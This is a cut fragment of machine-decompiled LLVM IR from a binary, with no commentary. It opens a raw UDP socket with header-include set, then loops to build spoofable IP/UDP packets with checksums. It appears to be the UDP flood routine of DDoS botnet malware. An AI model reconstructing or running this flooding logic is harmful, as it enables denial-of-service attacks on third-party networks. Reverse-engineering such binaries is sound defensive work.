  store i32 %v0_d184, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_d180, i32* %fp.global-to-local, align 4
  %v0_d194 = load i32, i32* @r4, align 4
  store i32 %v0_d194, i32* %r0.global-to-local, align 4
  %v4_d198 = inttoptr i32 %v0_d184 to i32*
  %v5_d198 = call i32 @function_a4e8(i32 %v0_d194, i32* %v4_d198, i32 4, i32 64)
  %v1_d1a0 = urem i32 %v5_d198, 256
  store i32 %v1_d1a0, i32* %ip.global-to-local, align 4
  %v0_d1a4 = load i32, i32* @r5, align 4
  store i32 %v0_d1a4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d1b0 = load i32, i32* @r4, align 4
  store i32 %v0_d1b0, i32* %r0.global-to-local, align 4
  %v5_d1b4 = trunc i32 %v5_d198 to i8
  %v6_d1b8 = inttoptr i32 %v0_d1a4 to i32*
  %v7_d1b8 = call i32 @function_a4e8(i32 %v0_d1b0, i32* %v6_d1b8, i32 5, i32 0)
  %v1_d1c4 = urem i32 %v7_d1b8, 256
  store i32 %v1_d1c4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d1d0 = load i32, i32* @r5, align 4
  store i32 %v0_d1d0, i32* %r1.global-to-local, align 4
  %v0_d1d4 = load i32, i32* @r4, align 4
  store i32 %v0_d1d4, i32* %r0.global-to-local, align 4
  %v5_d1dc = inttoptr i32 %v0_d1d0 to i32*
  %v6_d1dc = call i32 @function_a4e8(i32 %v0_d1d4, i32* %v5_d1dc, i32 6, i32 65535)
  %v0_d1e4 = load i32, i32* @r5, align 4
  store i32 %v0_d1e4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_d1dc, i32* @r7, align 4
  %v0_d1f4 = load i32, i32* @r4, align 4
  store i32 %v0_d1f4, i32* %r0.global-to-local, align 4
  %v4_d1f8 = inttoptr i32 %v0_d1e4 to i32*
  %v5_d1f8 = call i32 @function_a4e8(i32 %v0_d1f4, i32* %v4_d1f8, i32 7, i32 65535)
  %v0_d1fc = load i32, i32* @r5, align 4
  store i32 %v0_d1fc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_d1f8, i32* %sb.global-to-local, align 4
  %v0_d20c = load i32, i32* @r4, align 4
  store i32 %v0_d20c, i32* %r0.global-to-local, align 4
  %v4_d210 = inttoptr i32 %v0_d1fc to i32*
  %v5_d210 = call i32 @function_a4e8(i32 %v0_d20c, i32* %v4_d210, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d21c = load i32, i32* @r5, align 4
  store i32 %v0_d21c, i32* %r1.global-to-local, align 4
  store i32 %v5_d210, i32* @r6, align 4
  %v0_d224 = load i32, i32* @r4, align 4
  store i32 %v0_d224, i32* %r0.global-to-local, align 4
  %v4_d228 = inttoptr i32 %v0_d21c to i32*
  %v5_d228 = call i32 @function_a4e8(i32 %v0_d224, i32* %v4_d228, i32 1, i32 1)
  %v2_d234 = load i32, i32* @global_var_1ec7c.86, align 4
  store i32 %v2_d234, i32* %r3.global-to-local, align 4
  %v1_d238 = urem i32 %v5_d228, 256
  store i32 %v1_d238, i32* %ip.global-to-local, align 4
  %v0_d23c = load i32, i32* @r5, align 4
  store i32 %v0_d23c, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_d244 = load i32, i32* @r4, align 4
  store i32 %v0_d244, i32* %r0.global-to-local, align 4
  %v5_d24c = inttoptr i32 %v0_d23c to i32*
  %v6_d24c = call i32 @function_a4e8(i32 %v0_d244, i32* %v5_d24c, i32 25, i32 %v2_d234)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d260 = call i32 @function_13f50(i32 2, i32 3, i32 17)
  store i32 %v3_d260, i32* %r0.global-to-local, align 4
  %v7_d264 = icmp eq i32 %v3_d260, -1
  store i1 %v7_d264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d264, label %dec_label_pc_d68c, label %dec_label_pc_d270

dec_label_pc_d270:                                ; preds = %dec_label_pc_d124
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d278 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d278, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_d28c = call i32 @function_13f20(i32 %v3_d260, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_d28c, i32* %r0.global-to-local, align 4
  %v7_d290 = icmp eq i32 %v6_d28c, -1
  store i1 %v7_d290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d290, label %dec_label_pc_d684, label %dec_label_pc_d298

dec_label_pc_d298:                                ; preds = %dec_label_pc_d270
  %v0_d298 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_d2a4 = urem i32 %v0_d298, 65536
  store i32 %v3_d2a4, i32* %r2.global-to-local, align 4
  %v3_d2a8 = icmp ugt i32 %v3_d2a4, 1459
  %v9_d2a8 = icmp eq i32 %v3_d2a4, 1460
  store i1 %v9_d2a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d2a8, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_d298
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_d298, %bb
  %v0_d2b0 = phi i32 [ %v3_d2a4, %dec_label_pc_d298 ], [ 1460, %bb ]
  %v0_d2b4 = load i32, i32* %fp.global-to-local, align 4
  %v3_d2b4 = mul i32 %v0_d2b4, 65536
  store i32 %v3_d2b4, i32* %r0.global-to-local, align 4
  %v3_d2b8 = urem i32 %v0_d2b4, 65536
  store i32 %v3_d2b8, i32* %r2.global-to-local, align 4
  %v0_d2bc = load i32, i32* @sl, align 4
  %v2_d2bc = icmp eq i32 %v0_d2bc, 0
  store i1 %v2_d2bc, i1* %cpsr_z.global-to-local, align 1
  %v0_d2c0 = load i32, i32* %sb.global-to-local, align 4
  %v0_d2c4 = load i32, i32* @r7, align 4
  %tmp72 = icmp slt i32 %v0_d2bc, 1
  br i1 %tmp72, label %bb73, label %bb74

bb73:                                             ; preds = %bb71
  store i32 %v0_d2b0, i32* %r2.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %bb71, %bb73
  %v5_d2ec = phi i32 [ %v3_d2b8, %bb71 ], [ %v0_d2b0, %bb73 ]
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2d4 = urem i32 %v0_d2c4, 65536
  store i32 %v3_d2d4, i32* %r3.global-to-local, align 4
  %v3_d2d8 = urem i32 %v0_d2c0, 65536
  store i32 %v3_d2d8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %tmp72, label %.thread, label %dec_label_pc_d2f4

.thread:                                          ; preds = %bb74
  %v6_d2e8 = add nsw i32 %v5_d2ec, 28
  store i32 %v6_d2e8, i32* @fp, align 4
  %v6_d2ec = add nsw i32 %v5_d2ec, 8
  store i32 %v6_d2ec, i32* @sb, align 4
  br label %dec_label_pc_d468

dec_label_pc_d2f4:                                ; preds = %bb74
  %v1_d2f8 = add nuw nsw i32 %v0_d2b0, 28
  store i32 %v1_d2f8, i32* @fp, align 4
  %tmp75 = mul nuw nsw i32 %v1_d2f8, 256
  %v1_d304 = and i32 %tmp75, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp76 = udiv i32 %v0_d2b4, 256
  %v3_d308 = urem i32 %tmp76, 256
  %v2_d31c = icmp eq i32 %v1_d1c4, 0
  store i1 %v2_d31c, i1* %cpsr_z.global-to-local, align 1
  %v1_d320 = urem i32 %v0_d2b4, 256
  %v1_d328 = add nuw nsw i32 %v0_d2b0, 8
  store i32 %v1_d328, i32* @sb, align 4
  %v1_d330 = urem i32 %v0_d2c4, 256
  %v1_d334 = urem i32 %v0_d2c0, 256
  store i32 %v1_d334, i32* %ip.global-to-local, align 4
  store i32 %v1_d304, i32* %r3.global-to-local, align 4
  %tmp77 = mul nuw nsw i32 %v1_d328, 256
  %v4_d340 = mul nuw nsw i32 %v1_d320, 256
  %v5_d340 = or i32 %v4_d340, %v3_d308
  store i32 %v5_d340, i32* %r0.global-to-local, align 4
  %v3_d344 = mul nuw nsw i32 %v1_d330, 256
  store i32 %v3_d344, i32* %r2.global-to-local, align 4
  %tmp78 = udiv i32 %v0_d2c0, 256
  %v3_d348 = urem i32 %tmp78, 256
  %v1_d34c = and i32 %tmp77, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  store i32 %v1_d34c, i32* %r1.global-to-local, align 4
  %tmp79 = udiv i32 %v1_d2f8, 256
  %v4_d350 = urem i32 %tmp79, 256
  %v5_d350 = or i32 %v4_d350, %v1_d304
  store i32 %v5_d350, i32* @lr, align 4
  %tmp80 = udiv i32 %v0_d2c4, 256
  %v4_d354 = urem i32 %tmp80, 256
  %v5_d354 = or i32 %v4_d354, %v3_d344
  store i32 %v5_d354, i32* @r4, align 4
  %v5_d358 = trunc i32 %tmp79 to i8
  %v5_d35c = trunc i32 %tmp76 to i8
  %v4_d360 = mul nuw nsw i32 %v1_d334, 256
  %v5_d360 = or i32 %v4_d360, %v3_d348
  store i32 %v5_d360, i32* @r5, align 4
  %tmp81 = udiv i32 %v1_d328, 256
  %v4_d364 = urem i32 %tmp81, 256
  %v5_d364 = or i32 %v4_d364, %v1_d34c
  store i32 %v5_d364, i32* @r7, align 4
  br i1 %v2_d31c, label %dec_label_pc_d36c, label %dec_label_pc_d694

dec_label_pc_d36c:                                ; preds = %dec_label_pc_d2f4
  %v3_d36c36 = udiv i32 %v1_d304, 256
  store i32 %v3_d36c36, i32* %ip.global-to-local, align 4
  store i32 %v1_d320, i32* %r0.global-to-local, align 4
  store i32 %v1_d330, i32* %r1.global-to-local, align 4
  store i32 %v1_d334, i32* %r2.global-to-local, align 4
  %v3_d37c37 = udiv i32 %v1_d34c, 256
  store i32 %v3_d37c37, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  %v4_d3e0 = sext i8 %v5_d17c to i32
  %v4_d420 = sext i8 %v5_d35c to i32
  %sext15 = mul i32 %v0_d2b4, 16777216
  %v4_d424 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v0_d2c4, 16777216
  %v4_d43c = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_d34c, 65536
  %v4_d440 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_d2c0, 16777216
  %v4_d444 = sdiv i32 %sext18, 16777216
  %v1_d42c = trunc i32 %v3_d36c36 to i8
  %v1_d44c = trunc i32 %v4_d440 to i8
  br label %dec_label_pc_d398

dec_label_pc_d398:                                ; preds = %dec_label_pc_d398, %dec_label_pc_d36c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_d3a4 = call i32 @function_14254(i32 1510, i32 1)
  store i32 %v2_d3a4, i32* %r0.global-to-local, align 4
  store i32 %v2_d144, i32* %ip.global-to-local, align 4
  %v3_d3ac = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d3ac, i32* %r2.global-to-local, align 4
  %v2_d3b0 = load i32, i32* @r6, align 4
  %v5_d3b0 = mul i32 %v2_d3b0, 4
  %v6_d3b0 = add i32 %v5_d3b0, %v2_d144
  %v7_d3b0 = inttoptr i32 %v6_d3b0 to i32*
  store i32 %v2_d3a4, i32* %v7_d3b0, align 4
  %v0_d3b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_d3b4 = load i32, i32* %r2.global-to-local, align 4
  %v4_d3b4 = mul i32 %v1_d3b4, 4
  %v5_d3b4 = add i32 %v4_d3b4, %v0_d3b4
  %v6_d3b4 = inttoptr i32 %v5_d3b4 to i32*
  %v7_d3b4 = load i32, i32* %v6_d3b4, align 4
  store i32 %v7_d3b4, i32* %r1.global-to-local, align 4
  %v1_d3b8 = inttoptr i32 %v7_d3b4 to i8*
  %v2_d3b8 = load i8, i8* %v1_d3b8, align 1
  %tmp = urem i8 %v2_d3b8, 16
  %v1_d3bc = zext i8 %tmp to i32
  %v1_d3c0 = or i32 %v1_d3bc, 64
  store i32 %v1_d3c0, i32* %r3.global-to-local, align 4
  %v1_d3c4 = trunc i32 %v1_d3c0 to i8
  store i8 %v1_d3c4, i8* %v1_d3b8, align 1
  %v0_d3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d3c8 = inttoptr i32 %v0_d3c8 to i8*
  %v2_d3c8 = load i8, i8* %v1_d3c8, align 1
  %v3_d3c8 = zext i8 %v2_d3c8 to i32
  %v1_d3cc = and i32 %v3_d3c8, 240
  %v1_d3d0 = or i32 %v1_d3cc, 5
  store i32 %v1_d3d0, i32* %r2.global-to-local, align 4
  %v3_d3d8 = add i32 %v0_d3c8, 9
  %v4_d3d8 = inttoptr i32 %v3_d3d8 to i8*
  store i8 17, i8* %v4_d3d8, align 1
  %v0_d3dc = load i32, i32* %r2.global-to-local, align 4
  %v1_d3dc = trunc i32 %v0_d3dc to i8
  %v2_d3dc = load i32, i32* %r1.global-to-local, align 4
  %v3_d3dc = inttoptr i32 %v2_d3dc to i8*
  store i8 %v1_d3dc, i8* %v3_d3dc, align 1
  store i32 %v4_d3e0, i32* %r0.global-to-local, align 4
  %v2_d3e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_d3e4 = add i32 %v2_d3e4, 1
  %v4_d3e4 = inttoptr i32 %v3_d3e4 to i8*
  store i8 %v5_d17c, i8* %v4_d3e4, align 1
  %v2_d3ec = load i32, i32* %r1.global-to-local, align 4
  %v3_d3ec = add i32 %v2_d3ec, 8
  %v4_d3ec = inttoptr i32 %v3_d3ec to i8*
  store i8 %v5_d1b4, i8* %v4_d3ec, align 1
  %v3_d3f0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d3f0, i32* %r2.global-to-local, align 4
  store i32 %v6_d24c, i32* %ip.global-to-local, align 4
  %v3_d3f8 = mul i32 %v3_d3f0, 32
  store i32 %v3_d3f8, i32* %r3.global-to-local, align 4
  %v1_d3fc = load i32, i32* %r1.global-to-local, align 4
  %v2_d3fc = add i32 %v1_d3fc, 12
  %v3_d3fc = inttoptr i32 %v2_d3fc to i32*
  store i32 %v6_d24c, i32* %v3_d3fc, align 4
  %v0_d400 = load i32, i32* %r3.global-to-local, align 4
  %v1_d400 = load i32, i32* %r2.global-to-local, align 4
  %tmp84 = mul i32 %v1_d400, -8
  %v5_d400 = add i32 %v0_d400, %tmp84
  %v1_d404 = load i32, i32* @r8, align 4
  %v2_d404 = add i32 %v5_d400, %v1_d404
  store i32 %v2_d404, i32* %r3.global-to-local, align 4
  %v1_d408 = add i32 %v2_d404, 16
  %v2_d408 = inttoptr i32 %v1_d408 to i32*
  %v3_d408 = load i32, i32* %v2_d408, align 4
  %v1_d40c = load i32, i32* %r1.global-to-local, align 4
  %v2_d40c = add i32 %v1_d40c, 16
  %v3_d40c = inttoptr i32 %v2_d40c to i32*
  store i32 %v3_d408, i32* %v3_d40c, align 4
  %v0_d414 = load i32, i32* %r2.global-to-local, align 4
  %v1_d414 = add i32 %v0_d414, 1
  store i32 %v1_d414, i32* @r6, align 4
  %v2_d418 = load i32, i32* %r1.global-to-local, align 4
  %v3_d418 = add i32 %v2_d418, 2
  %v4_d418 = inttoptr i32 %v3_d418 to i8*
  store i8 %v5_d358, i8* %v4_d418, align 1
  store i32 %v4_d420, i32* %ip.global-to-local, align 4
  store i32 %v4_d424, i32* %r0.global-to-local, align 4
  %v0_d428 = load i32, i32* %r1.global-to-local, align 4
  %v1_d428 = add i32 %v0_d428, 20
  store i32 %v1_d428, i32* %r3.global-to-local, align 4
  %v3_d42c = add i32 %v0_d428, 3
  %v4_d42c = inttoptr i32 %v3_d42c to i8*
  store i8 %v1_d42c, i8* %v4_d42c, align 1
  %v0_d430 = load i32, i32* %ip.global-to-local, align 4
  %v1_d430 = trunc i32 %v0_d430 to i8
  %v2_d430 = load i32, i32* %r1.global-to-local, align 4
  %v3_d430 = add i32 %v2_d430, 4
  %v4_d430 = inttoptr i32 %v3_d430 to i8*
  store i8 %v1_d430, i8* %v4_d430, align 1
  %v0_d434 = load i32, i32* %r0.global-to-local, align 4
  %v1_d434 = trunc i32 %v0_d434 to i8
  %v2_d434 = load i32, i32* %r1.global-to-local, align 4
  %v3_d434 = add i32 %v2_d434, 5
  %v4_d434 = inttoptr i32 %v3_d434 to i8*
  store i8 %v1_d434, i8* %v4_d434, align 1
  %v0_d438 = load i32, i32* @r4, align 4
  %v1_d438 = trunc i32 %v0_d438 to i8
  %v2_d438 = load i32, i32* %r1.global-to-local, align 4
  %v3_d438 = add i32 %v2_d438, 20
  %v4_d438 = inttoptr i32 %v3_d438 to i8*
  store i8 %v1_d438, i8* %v4_d438, align 1
  store i32 %v4_d43c, i32* %r2.global-to-local, align 4
  store i32 %v4_d440, i32* %r1.global-to-local, align 4
  store i32 %v4_d444, i32* %ip.global-to-local, align 4
  %v0_d448 = load i32, i32* @r6, align 4
  %v1_d448 = load i32, i32* @sl, align 4
  %v9_d448 = icmp eq i32 %v0_d448, %v1_d448
  store i1 %v9_d448, i1* %cpsr_z.global-to-local, align 1
  %v2_d44c = load i32, i32* %r3.global-to-local, align 4
  %v3_d44c = add i32 %v2_d44c, 5
  %v4_d44c = inttoptr i32 %v3_d44c to i8*
  store i8 %v1_d44c, i8* %v4_d44c, align 1
  %v0_d450 = load i32, i32* %r2.global-to-local, align 4
  %v1_d450 = trunc i32 %v0_d450 to i8
  %v2_d450 = load i32, i32* %r3.global-to-local, align 4
  %v3_d450 = add i32 %v2_d450, 1
  %v4_d450 = inttoptr i32 %v3_d450 to i8*
  store i8 %v1_d450, i8* %v4_d450, align 1
  %v0_d454 = load i32, i32* @r5, align 4
  %v1_d454 = trunc i32 %v0_d454 to i8
  %v2_d454 = load i32, i32* %r3.global-to-local, align 4
  %v3_d454 = add i32 %v2_d454, 2
  %v4_d454 = inttoptr i32 %v3_d454 to i8*
  store i8 %v1_d454, i8* %v4_d454, align 1
  %v0_d458 = load i32, i32* %ip.global-to-local, align 4
  %v1_d458 = trunc i32 %v0_d458 to i8
  %v2_d458 = load i32, i32* %r3.global-to-local, align 4
  %v3_d458 = add i32 %v2_d458, 3
  %v4_d458 = inttoptr i32 %v3_d458 to i8*
  store i8 %v1_d458, i8* %v4_d458, align 1
  %v0_d45c = load i32, i32* @r7, align 4
  %v1_d45c = trunc i32 %v0_d45c to i8
  %v2_d45c = load i32, i32* %r3.global-to-local, align 4
  %v3_d45c = add i32 %v2_d45c, 4
  %v4_d45c = inttoptr i32 %v3_d45c to i8*
  store i8 %v1_d45c, i8* %v4_d45c, align 1
  %v0_d460 = load i32, i32* @r6, align 4
  store i32 %v0_d460, i32* %stack_var_-40, align 4
  %v5_d464 = icmp slt i32 %v0_d448, %v1_d448
  br i1 %v5_d464, label %dec_label_pc_d398, label %dec_label_pc_d468

dec_label_pc_d468:                                ; preds = %dec_label_pc_d6c8, %dec_label_pc_d398, %.thread
  %v0_d468 = load i32, i32* @sl, align 4
  %v2_d468 = icmp eq i32 %v0_d468, 0
  store i1 %v2_d468, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d614 = icmp eq i32 %v3_d2b8, 65535
  %v2_d4e0 = icmp eq i32 %v1_d238, 0
  %v2_d4a8 = icmp eq i32 %v6_d24c, -1
  %v7_d4a8 = icmp eq i32 %v6_d24c, -1
  br label %dec_label_pc_d470.outer

dec_label_pc_d470.outer:                          ; preds = %dec_label_pc_d590, %dec_label_pc_d468
  %v1_d470.ph.in = phi i32 [ %v1_d584, %dec_label_pc_d590 ], [ %v0_d468, %dec_label_pc_d468 ]
  %v0_d470.ph = phi i1 [ %v2_d590, %dec_label_pc_d590 ], [ %v2_d468, %dec_label_pc_d468 ]
  %v1_d470.ph = icmp slt i32 %v1_d470.ph.in, 0
  %v4_d470 = or i1 %v1_d470.ph, %v0_d470.ph
  br label %dec_label_pc_d470

dec_label_pc_d470:                                ; preds = %dec_label_pc_d470.outer, %dec_label_pc_d470
  br i1 %v4_d470, label %dec_label_pc_d470, label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d470
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d4e8, %dec_label_pc_d474
  %v1_d494 = phi i32 [ %v1_d580, %dec_label_pc_d4e8 ], [ 0, %dec_label_pc_d474 ]
  %v5_d484 = mul i32 %v1_d494, 24
  %v1_d488 = load i32, i32* @r8, align 4
  %v2_d488 = add i32 %v1_d488, %v5_d484
  store i32 %v2_d488, i32* %r3.global-to-local, align 4
  store i32 %v2_d144, i32* %ip.global-to-local, align 4
  %v1_d490 = add i32 %v2_d488, 20
  %v2_d490 = inttoptr i32 %v1_d490 to i8*
  %v3_d490 = load i8, i8* %v2_d490, align 1
  %v4_d490 = zext i8 %v3_d490 to i32
  store i32 %v4_d490, i32* %r2.global-to-local, align 4
  %v4_d494 = mul i32 %v1_d494, 4
  %v5_d494 = add i32 %v4_d494, %v2_d144
  %v6_d494 = inttoptr i32 %v5_d494 to i32*
  %v7_d494 = load i32, i32* %v6_d494, align 4
  store i32 %v7_d494, i32* @r5, align 4
  %v7_d498 = icmp eq i8 %v3_d490, 31
  store i1 %v7_d498, i1* %cpsr_z.global-to-local, align 1
  %v1_d49c = add i32 %v7_d494, 20
  store i32 %v1_d49c, i32* @r6, align 4
  %tmp85 = icmp ult i8 %v3_d490, 32
  br i1 %tmp85, label %dec_label_pc_d59c, label %dec_label_pc_d4a4

dec_label_pc_d4a4:                                ; preds = %dec_label_pc_d480
  store i32 %v6_d24c, i32* %r0.global-to-local, align 4
  store i1 %v7_d4a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d4a8, label %dec_label_pc_d604, label %dec_label_pc_d4b0

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d59c, %dec_label_pc_d4a4
  store i32 %v3_d2b8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d614, label %dec_label_pc_d620, label %dec_label_pc_d4c4

dec_label_pc_d4c4:                                ; preds = %dec_label_pc_d604.dec_label_pc_d4c4_crit_edge, %dec_label_pc_d4b0
  %v1_d4c8 = phi i32 [ %v1_d4c8.pre, %dec_label_pc_d604.dec_label_pc_d4c4_crit_edge ], [ 65535, %dec_label_pc_d4b0 ]
  store i32 %v3_d2d4, i32* %r2.global-to-local, align 4
  %v9_d4c8 = icmp eq i32 %v3_d2d4, %v1_d4c8
  store i1 %v9_d4c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d4c8, label %dec_label_pc_d63c, label %dec_label_pc_d4d0

dec_label_pc_d4d0:                                ; preds = %dec_label_pc_d620.dec_label_pc_d4d0_crit_edge, %dec_label_pc_d4c4
  %v1_d4d4 = phi i32 [ %v1_d4d4.pre, %dec_label_pc_d620.dec_label_pc_d4d0_crit_edge ], [ %v1_d4c8, %dec_label_pc_d4c4 ]
  store i32 %v3_d2d8, i32* %r3.global-to-local, align 4
  %v9_d4d4 = icmp eq i32 %v3_d2d8, %v1_d4d4
  store i1 %v9_d4d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d4d4, label %dec_label_pc_d658, label %dec_label_pc_d4dc

dec_label_pc_d4dc:                                ; preds = %dec_label_pc_d63c, %dec_label_pc_d4d0
  store i32 %v1_d238, i32* %ip.global-to-local, align 4
  store i1 %v2_d4e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d4e0, label %dec_label_pc_d4e8, label %dec_label_pc_d674

dec_label_pc_d4e8:                                ; preds = %dec_label_pc_d4dc, %dec_label_pc_d658, %dec_label_pc_d674
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d4ec = load i32, i32* @r7, align 4
  %v1_d4ec = trunc i32 %v0_d4ec to i8
  %v2_d4ec = load i32, i32* @r5, align 4
  %v3_d4ec = add i32 %v2_d4ec, 10
  %v4_d4ec = inttoptr i32 %v3_d4ec to i8*
  store i8 %v1_d4ec, i8* %v4_d4ec, align 1
  %v0_d4f0 = load i32, i32* @r7, align 4
  %v1_d4f0 = trunc i32 %v0_d4f0 to i8
  %v2_d4f0 = load i32, i32* @r5, align 4
  %v3_d4f0 = add i32 %v2_d4f0, 11
  %v4_d4f0 = inttoptr i32 %v3_d4f0 to i8*
  store i8 %v1_d4f0, i8* %v4_d4f0, align 1
  %v0_d4f4 = load i32, i32* @r5, align 4
  store i32 %v0_d4f4, i32* @r0, align 4
  %v2_d4f8 = call i32 @function_e424(i32 %v0_d4f4, i32 20)
  %v3_d4f8 = trunc i32 %v2_d4f8 to i8
  store i32 %v2_d4f8, i32* %r0.global-to-local, align 4
  %v4_d4fc = sdiv i32 %v2_d4f8, 256
  store i32 %v4_d4fc, i32* %r3.global-to-local, align 4
  %v1_d500 = trunc i32 %v4_d4fc to i8
  %v2_d500 = load i32, i32* @r5, align 4
  %v3_d500 = add i32 %v2_d500, 11
  %v4_d500 = inttoptr i32 %v3_d500 to i8*
  store i8 %v1_d500, i8* %v4_d500, align 1
  %v3_d504 = load i32, i32* @r5, align 4
  %v4_d504 = add i32 %v3_d504, 10
  %v5_d504 = inttoptr i32 %v4_d504 to i8*
  store i8 %v3_d4f8, i8* %v5_d504, align 1
  %v0_d508 = load i32, i32* @r7, align 4
  %v1_d508 = trunc i32 %v0_d508 to i8
  %v2_d508 = load i32, i32* @r6, align 4
  %v3_d508 = add i32 %v2_d508, 6
  %v4_d508 = inttoptr i32 %v3_d508 to i8*
  store i8 %v1_d508, i8* %v4_d508, align 1
  %v0_d50c = load i32, i32* @r7, align 4
  %v1_d50c = trunc i32 %v0_d50c to i8
  %v2_d50c = load i32, i32* @r6, align 4
  %v3_d50c = add i32 %v2_d50c, 7
  %v4_d50c = inttoptr i32 %v3_d50c to i8*
  store i8 %v1_d50c, i8* %v4_d50c, align 1
  %v0_d510 = load i32, i32* @r5, align 4
  %v1_d510 = add i32 %v0_d510, 24
  %v2_d510 = inttoptr i32 %v1_d510 to i8*
  %v3_d510 = load i8, i8* %v2_d510, align 1
  %v4_d510 = zext i8 %v3_d510 to i32
  store i32 %v4_d510, i32* %r3.global-to-local, align 4
  %v1_d514 = add i32 %v0_d510, 25
  %v2_d514 = inttoptr i32 %v1_d514 to i8*
  %v3_d514 = load i8, i8* %v2_d514, align 1
  %v4_d514 = zext i8 %v3_d514 to i32
  %v0_d518 = load i32, i32* @r6, align 4
  store i32 %v0_d518, i32* @r1, align 4
  %v4_d51c = mul nuw nsw i32 %v4_d514, 256
  %v5_d51c = or i32 %v4_d51c, %v4_d510
  store i32 %v5_d51c, i32* %r2.global-to-local, align 4
  store i32 %v0_d510, i32* %r0.global-to-local, align 4
  %v0_d524 = load i32, i32* @sb, align 4
  store i32 %v0_d524, i32* %r3.global-to-local, align 4
  %v4_d528 = call i32 @function_e480(i32 %v0_d510, i32 %v0_d518, i32 %v5_d51c, i32 %v0_d524)
  %v5_d528 = trunc i32 %v4_d528 to i8
  store i32 %v4_d528, i32* %r0.global-to-local, align 4
  %v4_d52c38 = udiv i32 %v4_d528, 256
  %v1_d530 = trunc i32 %v4_d52c38 to i8
  %v2_d530 = load i32, i32* @r6, align 4
  %v3_d530 = add i32 %v2_d530, 7
  %v4_d530 = inttoptr i32 %v3_d530 to i8*
  store i8 %v1_d530, i8* %v4_d530, align 1
  %v3_d534 = load i32, i32* @r6, align 4
  %v4_d534 = add i32 %v3_d534, 6
  %v5_d534 = inttoptr i32 %v4_d534 to i8*
  store i8 %v5_d528, i8* %v5_d534, align 1
  %v3_d538 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d538, i32* %r3.global-to-local, align 4
  %v0_d53c = load i32, i32* @r5, align 4
  %v1_d53c = add i32 %v0_d53c, 20
  %v2_d53c = inttoptr i32 %v1_d53c to i32*
  %v3_d53c = load i32, i32* %v2_d53c, align 4
  %v3_d544 = udiv i32 %v3_d53c, 65536
  store i32 %v3_d544, i32* %r2.global-to-local, align 4
  %v5_d548 = mul i32 %v3_d538, 24
  %v1_d54c = load i32, i32* @r8, align 4
  %v2_d54c = add i32 %v1_d54c, %v5_d548
  store i32 %v2_d54c, i32* %ip.global-to-local, align 4
  %v3_d55035 = udiv i32 %v3_d53c, 16777216
  %v1_d554 = trunc i32 %v3_d55035 to i8
  %v3_d554 = add i32 %v2_d54c, 3
  %v4_d554 = inttoptr i32 %v3_d554 to i8*
  store i8 %v1_d554, i8* %v4_d554, align 1
  %v0_d558 = load i32, i32* %r2.global-to-local, align 4
  %v1_d558 = trunc i32 %v0_d558 to i8
  %v2_d558 = load i32, i32* %ip.global-to-local, align 4
  %v3_d558 = add i32 %v2_d558, 2
  %v4_d558 = inttoptr i32 %v3_d558 to i8*
  store i8 %v1_d558, i8* %v4_d558, align 1
